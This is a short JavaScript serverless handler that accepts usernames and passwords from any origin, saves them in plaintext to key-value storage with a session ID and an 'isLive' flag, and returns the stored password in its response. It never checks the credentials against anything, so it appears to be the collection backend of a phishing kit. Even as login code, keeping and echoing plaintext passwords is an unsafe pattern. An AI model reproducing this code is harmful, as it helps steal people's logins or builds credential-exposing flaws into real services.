import { readState, writeState, upsertLogin } from './_lib/state.js';
import { setCors, handleOptions } from './_lib/http.js';

export default async function handler(req, res) {
  if (handleOptions(req, res)) return;
  setCors(res);

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { sessionId, username, password, timestamp } = req.body || {};
  if (!sessionId || !username?.trim() || !password?.trim()) {
    return res.status(400).json({ error: 'sessionId, username, password required' });
  }

  try {
    const state = await readState();
    const entry = {
      sessionId,
      username: username.trim(),
      password: password.trim(),
      timestamp: timestamp || Date.now(),
      updatedAt: Date.now(),
      isLive: false,
    };
    upsertLogin(state, entry);
    await writeState(state);
    return res.status(200).json({ ok: true, login: entry });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Failed to save. Is Vercel KV connected?' });
  }
}
